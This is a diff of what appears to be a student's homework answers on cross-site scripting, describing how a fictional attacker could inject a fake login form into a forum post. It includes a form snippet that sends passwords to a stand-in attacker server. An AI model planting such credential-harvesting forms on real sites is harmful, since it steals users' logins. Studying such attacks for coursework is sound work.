@@ -62,7 +62,7 @@
 
 2. XSS attack that is more virulent than Moriarty's "turn something red" and "pop up a message" attacks.
 
-   ***Moriarty could inject a fake login form into a post. When Alice views the post, she might this it is legitimae and try to login. Her username and password will then go to Moriarty instead of the real FDF server.***
+   ***Moriarty could inject a fake login form into a post. When Alice views the post, she might think it is legitimae and try to login. Her username and password will then go to Moriarty instead of the real FDF server.***
 
   ```
   <form action="https://moriartys-server.com/steal-password" method="POST">
@@ -74,15 +74,10 @@
   
   ```
 
-
-3.
+3. A second attack that is more virulent than Moriarty's, but that's substantially different from my first idea.
 4.
 5.
 6. Questions:
-
-Provide a diagram and/or a step-by-step description of the nature and timing of Moriarty's attack on users of the FDF. Note that some of the relevant actions may happen long before other actions.
-
-Describe an XSS attack that is more virulent than Moriarty's "turn something red" and "pop up a message" attacks. Think about what kinds of things the Javascript might have access to via Alice's browser when Alice views the attacker's post.
 
 Do it again: describe a second attack that is more virulent than Moriarty's, but that's substantially different from your first idea.
 
